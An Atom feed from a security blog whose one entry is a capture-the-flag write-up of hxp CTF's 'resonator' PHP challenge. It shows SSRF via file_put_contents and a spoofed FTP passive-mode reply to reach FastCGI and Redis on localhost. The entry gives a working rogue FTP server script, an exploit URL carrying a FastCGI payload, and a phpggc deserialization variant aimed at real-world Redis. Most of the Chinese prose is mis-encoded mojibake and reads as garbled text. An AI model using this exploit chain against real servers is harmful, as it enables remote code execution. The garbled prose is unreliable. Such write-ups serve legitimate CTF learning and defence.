<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rmb122&#39;s Notebook</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rmb122.com/"/>
  <updated>2021-01-13T07:05:06.673Z</updated>
  <id>https://rmb122.com/</id>
  
  <author>
    <name>rmb122</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hxp CTF resonator Writeup - SSRF via file_put_contents</title>
    <link href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/"/>
    <id>https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</id>
    <published>2020-12-30T07:02:46.000Z</published>
    <updated>2021-01-13T07:05:06.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®ç®€ä»‹"><a href="#é¢˜ç›®ç®€ä»‹" class="headerlink" title="é¢˜ç›®ç®€ä»‹"></a>é¢˜ç›®ç®€ä»‹</h2><p>åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.<br>é•¿åº¦åªæœ‰äº”è¡Œ,</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>] ?? <span class="string">'/tmp/file'</span>;</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>] ?? <span class="string">':)'</span>;</span><br><span class="line">file_put_contents($file, $data);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($file);</span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹ä¸æ˜¯ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å’Œå†™äº†ä¹ˆ, æˆ‘ä»¬å†çœ‹çœ‹ä»–çš„ Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/*</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> docker-stuff/default /etc/nginx/sites-enabled/default</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag.txt docker-stuff/readflag /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown 0:1337 /flag.txt /readflag &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod 040 /flag.txt &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod 2555 /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R root:root /var/www &amp;&amp; \</span></span><br><span class="line"><span class="bash">    find /var/www -<span class="built_in">type</span> d -<span class="built_in">exec</span> chmod 555 &#123;&#125; \; &amp;&amp; \</span></span><br><span class="line"><span class="bash">    find /var/www -<span class="built_in">type</span> f -<span class="built_in">exec</span> chmod 444 &#123;&#125; \;</span></span><br></pre></td></tr></table></figure><p><a href="http://www.conf" target="_blank" rel="noopener">www.conf</a></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[www]</span></span><br><span class="line"><span class="attr">user</span> = www-data</span><br><span class="line"><span class="attr">group</span> = www-data</span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br><span class="line"><span class="attr">listen.owner</span> = www-data</span><br><span class="line"><span class="attr">listen.group</span> = www-data</span><br></pre></td></tr></table></figure><p>é¢˜ç›®é™åˆ¶äº† flag å’Œ WEB ç›®å½•çš„æƒé™, æ— æ³•ç›´æ¥è¯» flag å’Œå†™ webshell, éœ€è¦ getshell åè¿è¡Œ readflag æ‰è¡Œ. æ ¹æ® php-fpm ç‰¹æ„è®¾ç½®äº†ç«¯å£ç›‘å¬, å¾ˆå¤§å¯èƒ½å°±æ˜¯éœ€è¦ SSRF fastcgi å getshell.<br>ä½†è¿™æ ·ä¸€çœ‹, ä¼¼ä¹å°±ç›´æ¥æ— è§£äº†, è™½ç„¶å­˜åœ¨ fastcgi ç›‘å¬åœ¨ 9000 ç«¯å£, ä½†æ˜¯å•å•å‡­å€Ÿ file_get_contents çš„å‡ ä¸ªåè®®, æ— æ³•æ§åˆ¶ä¼ é€’çš„å†…å®¹, php-fpm åœ¨æ”¶åˆ°æ— æ•ˆæ•°æ®åä¼šç›´æ¥ä¸­æ–­é“¾æ¥. å­˜åœ¨å¯èƒ½çš„æ˜¯ file_put_contents, æˆ‘ä»¬å¯ä»¥å®Œæ•´æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°.</p><h2 id="SSRF-via-file-put-contents"><a href="#SSRF-via-file-put-contents" class="headerlink" title="SSRF via file_put_contents"></a>SSRF via file_put_contents</h2><p>æ¥ä¸‹æ¥å°±éœ€è¦ä»‹ç»æœ¬ç¯‡æ–‡ç« çš„é‡ç‚¹, é€šè¿‡ file_put_contents æ¥è¾¾åˆ° SSRF ç›®çš„.<br>æˆ‘ä»¬å…ˆçœ‹çœ‹ php æ‰€æ”¯æŒçš„åè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; â€” Accessing local filesystem</span><br><span class="line">http:&#x2F;&#x2F; â€” Accessing HTTP(s) URLs</span><br><span class="line">ftp:&#x2F;&#x2F; â€” Accessing FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; â€” Accessing various I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; â€” Compression Streams</span><br><span class="line">data:&#x2F;&#x2F; â€” Data (RFC 2397)</span><br><span class="line">glob:&#x2F;&#x2F; â€” Find pathnames matching pattern</span><br><span class="line">phar:&#x2F;&#x2F; â€” PHP Archive</span><br><span class="line">ssh2:&#x2F;&#x2F; â€” Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; â€” RAR</span><br><span class="line">ogg:&#x2F;&#x2F; â€” Audio streams</span><br><span class="line">expect:&#x2F;&#x2F; â€” Process Interaction Streams</span><br></pre></td></tr></table></figure><p>ssh2, rar, ogg, expect éƒ½éœ€è¦é¢å¤–å®‰è£… PCEL æ‰©å±•, å†æ’é™¤ glob, data, zlib, php è¿™äº›æ˜æ˜¾æ²¡æœ‰å¤ªå¤§æ”»å‡»é¢çš„åè®®. å®é™…ä¸Šæœ‰å¯èƒ½åˆ©ç”¨çš„åè®®åªæœ‰ file, http, ftp, phar è¿™å››ç§.<br>æ–‡ä»¶ç³»ç»Ÿå±‚é¢çš„æ¼æ´ç”±äºå¤§éƒ¨åˆ†ç›®å½•éƒ½ä¸å¯ä»¥å†™, å¯ä»¥æ’é™¤ file, è€Œ http æ— æ³•ç”¨äº file_put_contents ä¹Ÿå¯ä»¥æ’é™¤. phar æ²¡æœ‰å·²çŸ¥çš„åŸç”Ÿ php åˆ©ç”¨é“¾, åŒæ ·å¯ä»¥æ’é™¤, æœ€åç•™ä¸‹çš„åªæœ‰ ftp åè®®.</p><p>ftp åè®®ç›¸å¯¹æ¯”è¾ƒå¤æ‚, å…¶ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹æ€§, ç›¸ä¿¡å¤§å®¶éƒ½å¬è¯´è¿‡, å°±æ˜¯ ftp çš„æ•°æ®ç«¯å£å’ŒæŒ‡ä»¤ç«¯å£æ˜¯åˆ†å¼€çš„, æˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„ 21 å·ç«¯å£å…¶å®æ˜¯ ftp çš„æŒ‡ä»¤ç«¯å£, ç”¨äºå‘é€æŒ‡ä»¤, æ¯”å¦‚è®¤è¯ç”¨æˆ·å’ŒæŒ‡å®šè¯»å–çš„æ–‡ä»¶. ä½†æ˜¯å¦‚æœæ˜¯ä¼ è¾“æ–‡ä»¶çš„å†…å®¹, ftp å®é™…ä¸Šä¼šé‡æ–°æ‰“å¼€ä¸€ä¸ªé“¾æ¥, åŒæ—¶è¿˜åˆ†ä¸ºä¸¤ç§æ¨¡å¼, è¢«åŠ¨æ¨¡å¼å’Œä¸»åŠ¨æ¨¡å¼.</p><p>è¿™é‡Œ wikipedia è®²çš„æ¯”è¾ƒæ¸…æ¥š, æˆ‘ç›´æ¥å¤åˆ¶ä¸€æ®µè¿‡æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FTPæœ‰ä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼šä¸»åŠ¨å’Œè¢«åŠ¨ã€‚ä¸»åŠ¨æ¨¡å¼è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åŒæ—¶æ‰“å¼€å¹¶ä¸”ç›‘å¬ä¸€ä¸ªç«¯å£ä»¥åˆ›å»ºè¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç”±äºå®‰è£…äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ã€‚æ‰€ä»¥ï¼Œåˆ›ç«‹äº†è¢«åŠ¨æ¨¡å¼ã€‚è¢«åŠ¨æ¨¡å¼åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯å®‰è£…äº†é˜²ç«å¢™çš„é—®é¢˜ã€‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„ <code>è¢«åŠ¨æ¨¡å¼åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹</code>, è¿™é‡Œæœ‰éå¸¸é‡è¦çš„ä¸€ç‚¹, è¿™ä¸ªè¢«åŠ¨æ¨¡å¼çš„ç«¯å£æ˜¯æœåŠ¡å™¨æŒ‡å®šçš„, è€Œä¸”è¿˜æœ‰ä¸€ç‚¹æ˜¯å¾ˆå¤šåœ°æ–¹æ²¡æœ‰æåˆ°çš„, å®é™…ä¸Šé™¤äº†ç«¯å£, æœåŠ¡å™¨çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥è¢«æŒ‡å®šçš„. ç”±äº ftp å’Œ http ç±»ä¼¼, åè®®å†…å®¹å…¨æ˜¯çº¯æ–‡æœ¬, æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°å®ƒæ˜¯å¦‚ä½•æŒ‡å®šåœ°å€å’Œç«¯å£çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode(192,168,9,2,4,8)</span><br></pre></td></tr></table></figure><p>227 å’Œ Entering Passive Mode ç±»ä¼¼ HTTP çš„çŠ¶æ€ç å’ŒçŠ¶æ€çŸ­è¯­, è€Œ  (192,168,9,2,4,8) ä»£è¡¨è®©å®¢æˆ·ç«¯è¿æ¥ 192.168.9.2 çš„ 4 * 256 + 8 = 1032 ç«¯å£.<br>è¿™æ ·è¿™ä¸ªå¦‚ä½•åˆ©ç”¨å°±å¾ˆæ˜æ˜¾äº†, file_put_contents åœ¨ä½¿ç”¨ ftp åè®®æ—¶, ä¼šå°† data çš„å†…å®¹ä¸Šä¼ åˆ° ftp æœåŠ¡å™¨, ç”±äºä¸Šé¢è¯´çš„ pasv æ¨¡å¼ä¸‹, æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£æ˜¯å¯æ§, æˆ‘ä»¬å¯ä»¥å°†åœ°å€å’Œç«¯å£æŒ‡åˆ° 127.0.0.1:9000. åŒæ—¶ç”±äº ftp çš„ç‰¹æ€§, ä¸ä¼šæœ‰ä»»ä½•çš„å¤šä½™å†…å®¹, ç±»ä¼¼ gopher åè®®, ä¼šå°† data åŸå°ä¸åŠ¨çš„å‘ç»™ 127.0.0.1:9000, å®Œç¾ç¬¦åˆæ”»å‡» fastcgi çš„è¦æ±‚.</p><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage: python3 exp.py local_port target_ip target_port</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">lport = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">raddr = sys.argv[<span class="number">2</span>].replace(<span class="string">'.'</span>, <span class="string">','</span>)</span><br><span class="line">rport = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">'0.0.0.0'</span>, lport))</span><br><span class="line">server.listen()</span><br><span class="line">client, _ = server.accept()</span><br><span class="line"></span><br><span class="line">client.send(<span class="string">b'220 a\n'</span>)</span><br><span class="line">client.send(<span class="string">b'331 a\n'</span>)</span><br><span class="line">client.send(<span class="string">b'230 a\n'</span>)</span><br><span class="line">client.send(<span class="string">b'220 a\n'</span>)</span><br><span class="line">client.send(<span class="string">b'550 a\n'</span>)</span><br><span class="line">client.send(<span class="string">f'227 aa (<span class="subst">&#123;raddr&#125;</span>,0,<span class="subst">&#123;rport&#125;</span>)\n'</span>.encode()) <span class="comment"># é»˜è®¤ php ä¼šä½¿ç”¨ EPSV å‘½ä»¤, è¿™ä¸ªåªèƒ½æŒ‡å®šç«¯å£, æ‰€ä»¥æˆ‘ä»¬éœ€è¦å‘é€ä¸¤æ¬¡ 227 è®© php fallback åˆ° PASV æ¨¡å¼</span></span><br><span class="line">client.send(<span class="string">f'227 aa (<span class="subst">&#123;raddr&#125;</span>,0,<span class="subst">&#123;rport&#125;</span>)\n'</span>.encode())</span><br><span class="line">client.send(<span class="string">b'150 Ok\n'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;target:8009&#x2F;?file&#x3D;ftp:&#x2F;&#x2F;your_server:19133&#x2F;anything&amp;data&#x3D;&#123;Gopherus ç”Ÿæˆçš„ fastcgi payload&#125;</span><br></pre></td></tr></table></figure><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>ext/standard/ftp_fopen_wrapper.c</code> æŸ¥çœ‹åˆ°ç›¸å…³æºç ,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">php_fopen_do_pasv</span><span class="params">(php_stream *stream, <span class="keyword">char</span> *ip, <span class="keyword">size_t</span> ip_size, <span class="keyword">char</span> **phoststart)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> tmp_line[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">int</span> result, i;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> portno;</span><br><span class="line">        <span class="keyword">char</span> *tpath, *ttpath, *hoststart=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_IPV6</span></span><br><span class="line">        <span class="comment">/* We try EPSV first, needed for IPv6 and works on some IPv4 servers */</span></span><br><span class="line">        php_stream_write_string(stream, <span class="string">"EPSV\r\n"</span>);</span><br><span class="line">        result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check if we got a 229 response */</span></span><br><span class="line">        <span class="keyword">if</span> (result != <span class="number">229</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                <span class="comment">/* EPSV failed, let's try PASV */</span></span><br><span class="line">                php_stream_write_string(stream, <span class="string">"PASV\r\n"</span>);</span><br><span class="line">                result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* make sure we got a 227 response */</span></span><br><span class="line">                <span class="keyword">if</span> (result != <span class="number">227</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* parse pasv command (129, 80, 95, 25, 13, 221) */</span></span><br><span class="line">                tpath = tmp_line;</span><br><span class="line">                <span class="comment">/* skip over the "227 Some message " part */</span></span><br><span class="line">                <span class="keyword">for</span> (tpath += <span class="number">4</span>; *tpath &amp;&amp; !<span class="built_in">isdigit</span>((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line">                <span class="keyword">if</span> (!*tpath) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* skip over the host ip, to get the port */</span></span><br><span class="line">                hoststart = tpath;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (; <span class="built_in">isdigit</span>((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line">                        <span class="keyword">if</span> (*tpath != <span class="string">','</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        *tpath=<span class="string">'.'</span>;</span><br><span class="line">                        tpath++;</span><br><span class="line">                &#125;</span><br><span class="line">                tpath[<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">                <span class="built_in">memcpy</span>(ip, hoststart, ip_size);</span><br><span class="line">                ip[ip_size<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">                hoststart = ip;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* pull out the MSB of the port */</span></span><br><span class="line">                portno = (<span class="keyword">unsigned</span> <span class="keyword">short</span>) strtoul(tpath, &amp;ttpath, <span class="number">10</span>) * <span class="number">256</span>;</span><br><span class="line">                <span class="keyword">if</span> (ttpath == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="comment">/* didn't get correct response from PASV */</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tpath = ttpath;</span><br><span class="line">                <span class="keyword">if</span> (*tpath != <span class="string">','</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tpath++;</span><br><span class="line">                <span class="comment">/* pull out the LSB of the port */</span></span><br><span class="line">                portno += (<span class="keyword">unsigned</span> <span class="keyword">short</span>) strtoul(tpath, &amp;ttpath, <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_IPV6</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* parse epsv command (|||6446|) */</span></span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>, tpath = tmp_line + <span class="number">4</span>; *tpath; tpath++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (*tpath == <span class="string">'|'</span>) &#123;</span><br><span class="line">                                i++;</span><br><span class="line">                                <span class="keyword">if</span> (i == <span class="number">3</span>)</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* pull out the port */</span></span><br><span class="line">                portno = (<span class="keyword">unsigned</span> <span class="keyword">short</span>) strtoul(tpath + <span class="number">1</span>, &amp;ttpath, <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span> (ttpath == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">/* didn't get correct response from EPSV/PASV */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (phoststart) &#123;</span><br><span class="line">                *phoststart = hoststart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> portno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tpath[<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(ip, hoststart, ip_size);</span><br><span class="line">ip[ip_size<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">hoststart = ip;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°, è™½ç„¶åœ¨æ³¨é‡Šé‡Œé¢å†™äº† <code>skip over the host ip, to get the port</code>, ä½†å®é™…ä¸Šè¿˜æ˜¯æ²¡æœ‰ skip, ä¼šå°† PASV ç»™å‡ºçš„ ip æœ€åç”¨äºæ•°æ®é€šé“çš„è¿æ¥, å¯¼è‡´æ¼æ´äº§ç”Ÿ.<br>åŒæ—¶ php è¿˜æ˜¯ç”¨ <code>portno += (unsigned short) strtoul(tpath, &amp;ttpath, 10);</code> æ¥è·å–çš„ç«¯å£, è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆ (127,0,0,1,0,9000) å’Œ (127,0,0,1,35,40) æ˜¯ä¸€æ ·çš„, å› ä¸º php åº•å±‚å¹¶æ²¡æœ‰æŠŠä»–è½¬æ¢æˆ unsigned char åå†ç›¸åŠ çš„ 233</p><h2 id="Real-World"><a href="#Real-World" class="headerlink" title="Real World"></a>Real World</h2><p>å› ä¸ºéœ€è¦å®Œæ•´æ§åˆ¶ filename çš„å…³ç³», è¿™ä¸ªæ¼æ´åœ¨çœŸå®æƒ…å†µä¸‹æ¯”è¾ƒä¸å¸¸è§, æˆ‘è§‰å¾—è¿™ä¸ªæ¼æ´åˆ©ç”¨åœ¨ååºåˆ—åŒ–ä¸Šå¯èƒ½ä¼šæ›´åŠ å¥½, æ¯”å¦‚ phpggc ä¸Šå­˜åœ¨çš„ä¸€ä¸ªé“¾ <code>SwiftMailer/FW1</code>, æˆ‘ä»¬å°† <code>gadgetchains/SwiftMailer/FW/1/gadgets.php</code> ä¸­çš„ <code>private $_mode = &#39;w+b&#39;;</code> æ”¹æˆ <code>private $_mode = &#39;w&#39;;</code>, è¿™æ ·ä½¿å¾— fopen å…¼å®¹ ftp åè®®, ä½¿å¾—ååºåˆ—åŒ–é“¾æ­£å¸¸è¿›è¡Œ.</p><p>ç„¶ååˆ©ç”¨çš„æ–¹å¼å…¶å®ä¸ rouge_mysql_server ç±»ä¼¼, éœ€è¦å®¢æˆ·ç«¯è¿æ¥æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨, æ¯”å¦‚æˆ‘ä»¬éœ€è¦æ”»å‡» redis æœåŠ¡, é¦–å…ˆåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œ <code>python3 server.py 19132 127.0.0.1 6379</code>, å†ä½¿ç”¨ <code>./phpggc SwiftMailer/FW1 &quot;ftp://rouge_ftp_server:19132/asd&quot; ssrf_payload_file</code> æ¥ç”Ÿæˆæˆ‘ä»¬çš„åºåˆ—åŒ– payload, åœ¨ååºåˆ—åŒ–æ¼æ´è¢«è§¦å‘å ssrf_payload_file ä¸­çš„å†…å®¹å°±ä¼šè¢«å‘å¾€ 127.0.0.1:6379.</p><p>è¿™æ ·å°±èƒ½æ‰©å±•éƒ¨åˆ†ååºåˆ—åŒ–åˆ©ç”¨çš„æ–¹å¼, æ¯”å¦‚åœ¨ä¸çŸ¥é“ WEB ç›®å½•, æˆ–è€… WEB ç›®å½•ä¸å¯å†™çš„æƒ…å†µä¸‹, å¯ä»¥å°è¯• ssrf ä¸€äº› redis æœåŠ¡, æ‰©å¤§æˆ‘ä»¬çš„æ”»å‡»é¢.</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a></li><li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></li><li><a href="https://github.com/php/php-src" target="_blank" rel="noopener">https://github.com/php/php-src</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é¢˜ç›®ç®€ä»‹&quot;&gt;&lt;a href=&quot;#é¢˜ç›®ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®ç®€ä»‹&quot;&gt;&lt;/a&gt;é¢˜ç›®ç®€ä»‹&lt;/h2&gt;&lt;p&gt;åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.&lt;br&gt;é•¿åº¦åªæœ‰äº”è¡Œ,&lt;/p&gt;
    
    </summary>
    
    
    
